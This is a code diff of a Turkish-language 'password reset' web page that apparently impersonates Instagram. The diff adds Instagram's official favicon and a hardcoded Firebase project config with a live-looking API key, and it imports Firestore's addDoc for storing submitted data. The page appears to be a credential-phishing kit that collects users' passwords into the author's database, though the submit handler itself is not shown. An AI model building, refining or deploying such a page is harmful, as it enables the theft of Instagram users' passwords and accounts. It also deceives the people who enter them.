@@ -4,9 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Şifre Yenile</title>
-    <!-- Orijinal Instagram logosu için favicon -->
-    <link rel="icon" type="image/x-icon" href="https://www.instagram.com/favicon.ico">
-    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNDI4s37cN.ico?v=1">
+    <script src="https://cdn.tailwindcss.com?client"></script>
     <style>
         .toggle-password {
             position: absolute;
@@ -14,7 +13,7 @@
             top: 50%;
             transform: translateY(-50%);
             cursor: pointer;
-            color: #000000;
+            color: #000000; /* Kara renk */
             font-size: 12px;
             font-weight: 600;
         }
@@ -82,39 +81,25 @@
 
     <!-- Firebase SDK -->
     <script type="module">
-        import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js';
-        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js';
-        import { getAuth, signInWithCustomToken, signInAnonymously } from 'https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js';
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
+        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js';
 
-        // Firebase yapılandırmasını ortam değişkenlerinden al
-        const firebaseConfig = JSON.parse(typeof __firebase_config !== 'undefined' ? __firebase_config : '{}');
-        const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
-        
+        const firebaseConfig = {
+            apiKey: "AIzaSyC-QALot6Wp5_mVe4s3ekB8JWq-qDUUOqQ",
+            authDomain: "premiumstore-adece.firebaseapp.com",
+            projectId: "premiumstore-adece",
+            storageBucket: "premiumstore-adece.firebasestorage.app",
+            messagingSenderId: "1058991155256",
+            appId: "1:1058991155256:web:942e3aaa544570355f9ecd",
+            measurementId: "G-2SCDNF8S2R"
+        };
+
+        // Firebase-i başlat
         let db;
-        let auth;
         try {
             const app = initializeApp(firebaseConfig);
             db = getFirestore(app);
-            auth = getAuth(app);
             console.log("Firestore başarıyla başladı");
-
-            // Kimlik doğrulamasını başlat
-            if (initialAuthToken) {
-                signInWithCustomToken(auth, initialAuthToken)
-                    .then(() => {
-                        console.log("Kimlik doğrulama başarıyla tamamlandı.");
-                    })
-                    .catch((error) => {
-                        console.error("Kimlik doğrulama hatası:", error);
-                    });
-            } else {
-                 signInAnonymously(auth).then(() => {
-                    console.log("Anonim kimlik doğrulama başarıyla tamamlandı.");
-                 }).catch((error) => {
-                    console.error("Anonim kimlik doğrulama hatası:", error);
-                 });
-            }
-
         } catch (error) {
             console.error("Firebase başlatma hatası:", error);
         }
